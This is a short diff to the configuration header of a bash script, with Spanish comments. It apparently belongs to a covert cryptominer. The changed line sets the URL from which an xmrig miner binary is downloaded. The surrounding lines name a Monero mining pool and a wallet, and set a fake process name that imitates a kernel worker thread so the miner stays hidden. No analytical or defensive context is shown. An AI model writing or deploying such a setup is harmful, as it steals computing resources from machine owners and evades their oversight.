@@ -1,6 +1,6 @@
 #!/bin/bash
 # --- CONFIGURACIÓN ---
-WGET_URL="https://raw.githubusercontent.com/p2151868-wq/xmr/main/xmrig"
+WGET_URL="https://github.com/p2151868-wq/xmr/raw/refs/heads/main/xmrig"
 FAKE_NAME="[kworker/u2:1-ev]"
 POOL="gulf.moneroocean.stream:10128"
 WALLET="46Sic8EdWznhfw1P7P7yTiJgChtRMRReVD4Jpa3L93pG1Xy1W9BxQZhFBBv9FMuRgC6tM6hkVRsKtSoRVoSvfB11NX49MCS"
